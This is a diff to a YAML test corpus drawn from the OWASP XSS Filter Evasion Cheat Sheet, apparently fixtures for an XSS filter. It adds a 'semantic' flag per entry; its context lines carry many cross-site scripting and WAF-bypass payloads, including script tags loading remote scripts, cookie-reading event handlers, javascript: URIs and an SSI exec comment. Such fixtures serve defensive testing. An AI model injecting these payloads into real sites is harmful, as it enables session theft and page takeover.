@@ -6,7 +6,7 @@ meta:
     url: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
     raw_md: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md
   generated_by: generate.py
-  generated_at: '2026-09-05T11:52:03+00:00'
+  generated_at: '2026-09-06T16:09:22+00:00'
   count: 148
 categories:
   tag: 危险标签（本身危险，不需属性）
@@ -63,6 +63,7 @@ tests:
   decoded: <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: Basic XSS Test Without Filter Evasion
   section: Tests
   lang: html
@@ -78,6 +79,7 @@ tests:
   - dangerous_tag
   - event_handler
   - js_uri
+  semantic: true
   source: XSS Locator (Polyglot)
   section: Tests
   lang: js
@@ -87,6 +89,7 @@ tests:
   decoded: \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
   rules:
   - event_handler
+  semantic: false
   source: Malformed A Tags
   section: Tests
   lang: js
@@ -96,6 +99,7 @@ tests:
   decoded: \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
   rules:
   - event_handler
+  semantic: false
   source: Malformed A Tags
   section: Tests
   lang: js
@@ -105,6 +109,7 @@ tests:
   decoded: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
   rules:
   - TODO_tokenizer
+  semantic: false
   source: Malformed IMG Tags
   section: Tests
   lang: html
@@ -114,6 +119,7 @@ tests:
   decoded: <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
   rules:
   - js_uri
+  semantic: false
   source: fromCharCode
   section: Tests
   lang: html
@@ -124,6 +130,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: Default SRC Tag to Get Past Filters that Check SRC Domain
   section: Tests
   lang: html
@@ -134,6 +141,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: Default SRC Tag by Leaving it Empty
   section: Tests
   lang: html
@@ -144,6 +152,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: Default SRC Tag by Leaving it out Entirely
   section: Tests
   lang: html
@@ -154,6 +163,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: On Error Alert
   section: Tests
   lang: html
@@ -165,6 +175,7 @@ tests:
   - event_handler
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: IMG onerror and JavaScript Alert Encode
   section: Tests
   lang: html
@@ -175,6 +186,7 @@ tests:
   decoded: ' <a href="javascript:alert(''XSS'')">Click Me!</a>'
   rules:
   - js_uri
+  semantic: false
   source: Decimal HTML Character References
   section: Tests
   lang: html
@@ -185,6 +197,7 @@ tests:
   decoded: <a href="javascript:alert('XSS')">Click Me</a>
   rules:
   - js_uri
+  semantic: false
   source: Decimal HTML Character References Without Trailing Semicolons
   section: Tests
   lang: html
@@ -195,6 +208,7 @@ tests:
   decoded: <a href="javascript:alert('XSS')">Click Me</a>
   rules:
   - js_uri
+  semantic: false
   source: Hexadecimal HTML Character References Without Trailing Semicolons
   section: Tests
   lang: html
@@ -204,6 +218,7 @@ tests:
   decoded: ' <a href="javascript:alert(''XSS'');">Click Me</a>'
   rules:
   - js_uri
+  semantic: false
   source: Embedded Tab
   section: Tests
   lang: html
@@ -213,6 +228,7 @@ tests:
   decoded: ' <a href="javascript:alert(''XSS'');">Click Me</a>'
   rules:
   - js_uri
+  semantic: false
   source: Embedded Encoded Tab
   section: Tests
   lang: html
@@ -222,6 +238,7 @@ tests:
   decoded: <a href="javascript:alert('XSS');">Click Me</a>
   rules:
   - js_uri
+  semantic: false
   source: Embedded Newline to Break Up XSS
   section: Tests
   lang: html
@@ -231,6 +248,7 @@ tests:
   decoded: <a href="javascript:alert('XSS');">Click Me</a>
   rules:
   - js_uri
+  semantic: false
   source: 'Example 1: Break Up XSS Attack with Embedded Carriage Return'
   section: Tests
   lang: html
@@ -240,6 +258,7 @@ tests:
   decoded: perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: 'Example 2: Break Up JavaScript Directive with Null'
   section: Tests
   lang: sh
@@ -249,6 +268,7 @@ tests:
   decoded: <a href="javascript:alert('XSS');">Click Me</a>
   rules:
   - js_uri
+  semantic: false
   source: 'Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS'
   section: Tests
   lang: html
@@ -258,6 +278,7 @@ tests:
   decoded: <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: 'Example 4: Non-alpha-non-digit XSS'
   section: Tests
   lang: html
@@ -267,6 +288,7 @@ tests:
   decoded: <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
   rules:
   - TODO_dangerous_tag
+  semantic: true
   source: 'Example 4: Non-alpha-non-digit XSS'
   section: Tests
   lang: html
@@ -276,6 +298,7 @@ tests:
   decoded: <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: 'Example 4: Non-alpha-non-digit XSS'
   section: Tests
   lang: html
@@ -285,6 +308,7 @@ tests:
   decoded: <<SCRIPT>alert("XSS");//\<</SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: Extraneous Open Brackets
   section: Tests
   lang: html
@@ -294,6 +318,7 @@ tests:
   decoded: <SCRIPT SRC=http://xss.rocks/xss.js?< B >
   rules:
   - script_tag
+  semantic: false
   source: No Closing Script Tags
   section: Tests
   lang: html
@@ -304,6 +329,7 @@ tests:
   rules:
   - script_tag
   - TODO_protocol
+  semantic: false
   source: Protocol Resolution in Script Tags
   section: Tests
   lang: html
@@ -313,6 +339,7 @@ tests:
   decoded: <IMG SRC="`<javascript:alert>`('XSS')"
   rules:
   - TODO_tokenizer
+  semantic: false
   source: Half Open HTML/JavaScript XSS Vector
   section: Tests
   lang: html
@@ -322,6 +349,7 @@ tests:
   decoded: \";alert('XSS');//
   rules:
   - TODO_js
+  semantic: false
   source: Escaping JavaScript Escapes
   section: Tests
   lang: js
@@ -331,6 +359,7 @@ tests:
   decoded: </script><script>alert('XSS');</script>
   rules:
   - script_tag
+  semantic: false
   source: Escaping JavaScript Escapes
   section: Tests
   lang: js
@@ -340,6 +369,7 @@ tests:
   decoded: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: End Title Tag
   section: Tests
   lang: html
@@ -350,6 +380,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: INPUT Image
   section: Tests
   lang: html
@@ -360,6 +391,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: BODY Image
   section: Tests
   lang: html
@@ -370,6 +402,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: IMG Dynsrc
   section: Tests
   lang: html
@@ -380,6 +413,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: IMG Lowsrc
   section: Tests
   lang: html
@@ -390,6 +424,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: List-style-image
   section: Tests
   lang: html
@@ -400,6 +435,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: VBscript in an Image
   section: Tests
   lang: html
@@ -410,6 +446,7 @@ tests:
   rules:
   - dangerous_tag
   - event_handler
+  semantic: false
   source: SVG Object Tag
   section: Tests
   lang: js
@@ -419,6 +456,7 @@ tests:
   decoded: Set.constructor`alert(document.domain)
   rules:
   - TODO_js
+  semantic: false
   source: ECMAScript 6
   section: Tests
   lang: js
@@ -429,6 +467,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: BODY Tag
   section: Tests
   lang: html
@@ -439,6 +478,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: BGSOUND
   section: Tests
   lang: js
@@ -448,6 +488,7 @@ tests:
   decoded: <BR SIZE="&{alert('XSS')}">
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: '& JavaScript includes'
   section: Tests
   lang: html
@@ -458,6 +499,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: STYLE sheet
   section: Tests
   lang: html
@@ -467,6 +509,7 @@ tests:
   decoded: <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: Remote style sheet
   section: Tests
   lang: html
@@ -477,6 +520,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: Remote style sheet part 2
   section: Tests
   lang: html
@@ -487,6 +531,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: Remote style sheet part 3
   section: Tests
   lang: html
@@ -496,6 +541,7 @@ tests:
   decoded: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: STYLE Tags that Breaks Up JavaScript for XSS
   section: Tests
   lang: html
@@ -505,6 +551,7 @@ tests:
   decoded: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
   rules:
   - TODO_dangerous_tag
+  semantic: true
   source: STYLE Attribute that Breaks Up an Expression
   section: Tests
   lang: html
@@ -518,6 +565,7 @@ tests:
     xss:ex/*XSS*//*/*/pression(alert("XSS"))''>'
   rules:
   - TODO_css
+  semantic: true
   source: IMG STYLE with Expressions
   section: Tests
   lang: html
@@ -528,6 +576,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: STYLE Tag using Background-image
   section: Tests
   lang: html
@@ -542,6 +591,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: STYLE Tag using Background
   section: Tests
   lang: html
@@ -551,6 +601,7 @@ tests:
   decoded: <XSS STYLE="xss:expression(alert('XSS'))">
   rules:
   - TODO_css
+  semantic: false
   source: Anonymous HTML with STYLE Attribute
   section: Tests
   lang: html
@@ -560,6 +611,7 @@ tests:
   decoded: '<XSS STYLE="behavior: url(xss.htc);">'
   rules:
   - TODO_css
+  semantic: false
   source: Local htc File
   section: Tests
   lang: html
@@ -569,6 +621,7 @@ tests:
   decoded: <script>alert("XSS")</script>
   rules:
   - script_tag
+  semantic: false
   source: US-ASCII Encoding
   section: Tests
   lang: js
@@ -579,6 +632,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: META
   section: Tests
   lang: html
@@ -589,6 +643,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: META using Data
   section: Tests
   lang: html
@@ -599,6 +654,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: META with Additional URL Parameter
   section: Tests
   lang: html
@@ -609,6 +665,7 @@ tests:
   rules:
   - dangerous_tag
   - js_uri
+  semantic: false
   source: IFRAME
   section: Tests
   lang: html
@@ -619,6 +676,7 @@ tests:
   rules:
   - dangerous_tag
   - event_handler
+  semantic: false
   source: IFRAME Event Based
   section: Tests
   lang: html
@@ -629,6 +687,7 @@ tests:
   rules:
   - dangerous_tag
   - js_uri
+  semantic: false
   source: FRAME
   section: Tests
   lang: html
@@ -639,6 +698,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: TABLE
   section: Tests
   lang: html
@@ -649,6 +709,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: TD
   section: Tests
   lang: html
@@ -659,6 +720,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: DIV Background-image
   section: Tests
   lang: html
@@ -668,6 +730,7 @@ tests:
   decoded: <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: DIV Background-image with Unicode XSS Exploit
   section: Tests
   lang: html
@@ -678,6 +741,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: DIV Background-image Plus Extra Characters
   section: Tests
   lang: html
@@ -688,6 +752,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: false
   source: DIV Expression
   section: Tests
   lang: html
@@ -705,6 +770,7 @@ tests:
     <![endif]-->'
   rules:
   - TODO_tokenizer
+  semantic: true
   source: Downlevel-Hidden Block
   section: Tests
   lang: js
@@ -715,6 +781,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: BASE Tag
   section: Tests
   lang: html
@@ -724,6 +791,7 @@ tests:
   decoded: <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
   rules:
   - dangerous_tag
+  semantic: false
   source: OBJECT Tag
   section: Tests
   lang: html
@@ -740,6 +808,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: EMBED SVG Which Contains XSS Vector
   section: Tests
   lang: html
@@ -753,6 +822,7 @@ tests:
     <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
   rules:
   - TODO_dangerous_tag
+  semantic: true
   source: XML Data Island with CDATA Obfuscation
   section: Tests
   lang: html
@@ -766,6 +836,7 @@ tests:
     <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>'
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: Locally hosted XML with embedded JavaScript that is generated using an XML data island
   section: Tests
   lang: html
@@ -791,6 +862,7 @@ tests:
     </BODY></HTML>'
   rules:
   - TODO_tokenizer
+  semantic: false
   source: HTML+TIME in XML
   section: Tests
   lang: html
@@ -800,6 +872,7 @@ tests:
   decoded: <SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: Assuming you can only fit in a few characters and it filters against `.js`
   section: Tests
   lang: html
@@ -808,6 +881,7 @@ tests:
   raw: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
   decoded: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
   rules: []
+  semantic: false
   source: SSI (Server Side Includes)
   section: Tests
   lang: js
@@ -820,6 +894,7 @@ tests:
 
     echo(''IPT>alert("XSS")</SCRIPT>''); ?>'
   rules: []
+  semantic: false
   source: PHP
   section: Tests
   lang: php
@@ -829,6 +904,7 @@ tests:
   decoded: <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: IMG Embedded Commands
   section: Tests
   lang: html
@@ -837,6 +913,7 @@ tests:
   raw: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
   decoded: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
   rules: []
+  semantic: false
   source: IMG Embedded Commands part II
   section: Tests
   lang: log
@@ -847,6 +924,7 @@ tests:
   rules:
   - script_tag
   - dangerous_tag
+  semantic: false
   source: Cookie Manipulation
   section: Tests
   lang: html
@@ -856,6 +934,7 @@ tests:
   decoded: <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -865,6 +944,7 @@ tests:
   decoded: <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -874,6 +954,7 @@ tests:
   decoded: <SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -883,6 +964,7 @@ tests:
   decoded: <SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -892,6 +974,7 @@ tests:
   decoded: <SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -901,6 +984,7 @@ tests:
   decoded: <SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -910,6 +994,7 @@ tests:
   decoded: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
   rules:
   - script_tag
+  semantic: false
   source: XSS Using HTML Quote Encapsulation
   section: Tests
   lang: html
@@ -918,6 +1003,7 @@ tests:
   raw: <A HREF="http://66.102.7.147/">XSS</A>
   decoded: <A HREF="http://66.102.7.147/">XSS</A>
   rules: []
+  semantic: false
   source: IP Versus Hostname
   section: Tests
   lang: html
@@ -926,6 +1012,7 @@ tests:
   raw: <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
   decoded: <A HREF="http://www.google.com">XSS</A>
   rules: []
+  semantic: false
   source: URL Encoding
   section: Tests
   lang: html
@@ -934,6 +1021,7 @@ tests:
   raw: <A HREF="http://1113982867/">XSS</A>
   decoded: <A HREF="http://1113982867/">XSS</A>
   rules: []
+  semantic: false
   source: DWORD Encoding
   section: Tests
   lang: html
@@ -942,6 +1030,7 @@ tests:
   raw: <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
   decoded: <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
   rules: []
+  semantic: false
   source: Hex Encoding
   section: Tests
   lang: html
@@ -950,6 +1039,7 @@ tests:
   raw: <A HREF="http://0102.0146.0007.00000223/">XSS</A>
   decoded: <A HREF="http://0102.0146.0007.00000223/">XSS</A>
   rules: []
+  semantic: false
   source: Octal Encoding
   section: Tests
   lang: html
@@ -960,6 +1050,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: Base64 Encoding
   section: Tests
   lang: html
@@ -968,6 +1059,7 @@ tests:
   raw: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>"
   decoded: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>"
   rules: []
+  semantic: false
   source: Mixed Encoding
   section: Tests
   lang: html
@@ -976,6 +1068,7 @@ tests:
   raw: <A HREF="//www.google.com/">XSS</A>
   decoded: <A HREF="//www.google.com/">XSS</A>
   rules: []
+  semantic: false
   source: Protocol Resolution Bypass
   section: Tests
   lang: html
@@ -984,6 +1077,7 @@ tests:
   raw: <A HREF="http://google.com/">XSS</A>
   decoded: <A HREF="http://google.com/">XSS</A>
   rules: &id001 []
+  semantic: false
   source: Removing CNAMEs
   section: Tests
   lang: html
@@ -992,6 +1086,7 @@ tests:
   raw: <A HREF="http://www.google.com./">XSS</A>
   decoded: <A HREF="http://www.google.com./">XSS</A>
   rules: *id001
+  semantic: false
   source: Removing CNAMEs
   section: Tests
   lang: html
@@ -1001,6 +1096,7 @@ tests:
   decoded: <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
   rules:
   - js_uri
+  semantic: false
   source: JavaScript Link Location
   section: Tests
   lang: html
@@ -1009,6 +1105,7 @@ tests:
   raw: <A HREF="http://www.google.com/ogle.com/">XSS</A>
   decoded: <A HREF="http://www.google.com/ogle.com/">XSS</A>
   rules: []
+  semantic: false
   source: Content Replace as Attack Vector
   section: Tests
   lang: html
@@ -1017,6 +1114,7 @@ tests:
   raw: a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
   decoded: a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
   rules: []
+  semantic: false
   source: Content Page Source Code
   section: Tests
   lang: html
@@ -1050,6 +1148,7 @@ tests:
     </script>'
   rules:
   - script_tag
+  semantic: false
   source: Share Page Source Code
   section: Tests
   lang: js
@@ -1058,6 +1157,7 @@ tests:
   raw: <a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
   decoded: <a href="/share?content_type=1&title=This is a regular title&content_type=1;alert(1)">Share</a>
   rules: []
+  semantic: false
   source: Content Page Output
   section: Tests
   lang: html
@@ -1091,6 +1191,7 @@ tests:
     </script>'
   rules:
   - script_tag
+  semantic: false
   source: Share Page Output
   section: Tests
   lang: js
@@ -1100,6 +1201,7 @@ tests:
   decoded: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
   rules:
   - script_tag
+  semantic: false
   source: Reflected XSS in JavaScript
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1109,6 +1211,7 @@ tests:
   decoded: /?xss=500); alert(document.cookie);//
   rules:
   - TODO_js
+  semantic: false
   source: Reflected XSS in JavaScript
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1118,6 +1221,7 @@ tests:
   decoded: <script> ... eval($\_GET\[xss\]); ... </script>
   rules:
   - script_tag
+  semantic: false
   source: DOM-based XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1127,6 +1231,7 @@ tests:
   decoded: /?xss=document.cookie
   rules:
   - TODO_js
+  semantic: false
   source: DOM-based XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1143,6 +1248,7 @@ tests:
 
     ...'
   rules: &id002 []
+  semantic: false
   source: XSS via request Redirection
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1159,6 +1265,7 @@ tests:
 
     ...'
   rules: *id002
+  semantic: false
   source: XSS via request Redirection
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
@@ -1168,6 +1275,7 @@ tests:
   decoded: /?param=<javascript:alert(document.cookie>)
   rules:
   - TODO_tokenizer
+  semantic: false
   source: XSS via request Redirection
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: html
@@ -1177,6 +1285,7 @@ tests:
   decoded: /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
   rules:
   - TODO_js_uri
+  semantic: false
   source: XSS via request Redirection
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: html
@@ -1188,6 +1297,7 @@ tests:
   - event_handler
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-2
@@ -1198,6 +1308,7 @@ tests:
   - event_handler
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-3
@@ -1206,6 +1317,7 @@ tests:
   decoded: <Input value = "XSS" type = text>
   rules:
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-4
@@ -1215,6 +1327,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-5
@@ -1225,6 +1338,7 @@ tests:
   - event_handler
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-6
@@ -1233,6 +1347,7 @@ tests:
   decoded: '"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
   rules:
   - script_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-7
@@ -1241,6 +1356,7 @@ tests:
   decoded: '"><img src="x:x" onerror="alert(XSS)">'
   rules:
   - TODO_tokenizer
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-8
@@ -1249,6 +1365,7 @@ tests:
   decoded: '"><iframe src="javascript:alert(XSS)">'
   rules:
   - TODO_tokenizer
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-9
@@ -1258,6 +1375,7 @@ tests:
   rules:
   - dangerous_tag
   - js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-10
@@ -1267,6 +1385,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-11
@@ -1276,6 +1395,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-12
@@ -1285,6 +1405,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-13
@@ -1295,6 +1416,7 @@ tests:
   - dangerous_tag
   - event_handler
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-14
@@ -1304,6 +1426,7 @@ tests:
   rules:
   - dangerous_tag
   - js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-15
@@ -1314,6 +1437,7 @@ tests:
   - script_tag
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-16
@@ -1323,6 +1447,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-17
@@ -1332,6 +1457,7 @@ tests:
   rules:
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-18
@@ -1341,6 +1467,7 @@ tests:
   rules:
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-19
@@ -1349,6 +1476,7 @@ tests:
   decoded: "</script><img/*\0/src=\"worksinchrome:prompt(1)\"/\0*/onerror='eval(src)'>"
   rules:
   - TODO_tokenizer
+  semantic: true
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-20
@@ -1358,6 +1486,7 @@ tests:
   rules:
   - TODO_css
   - TODO_dangerous_tag
+  semantic: true
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-21
@@ -1367,6 +1496,7 @@ tests:
   rules:
   - event_handler
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-22
@@ -1375,6 +1505,7 @@ tests:
   decoded: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>ClickMe
   rules:
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-23
@@ -1383,6 +1514,7 @@ tests:
   decoded: <script x> alert(1) </script 1=2
   rules:
   - script_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-24
@@ -1392,6 +1524,7 @@ tests:
   rules:
   - TODO_js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-25
@@ -1402,6 +1535,7 @@ tests:
   - event_handler
   - js_uri
   - TODO_dangerous_tag
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-26
@@ -1412,6 +1546,7 @@ tests:
   - script_tag
   - dangerous_tag
   - TODO_js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: waf-bypass-strings-for-xss-27
@@ -1421,6 +1556,7 @@ tests:
   rules:
   - dangerous_tag
   - js_uri
+  semantic: false
   source: WAF ByPass Strings for XSS
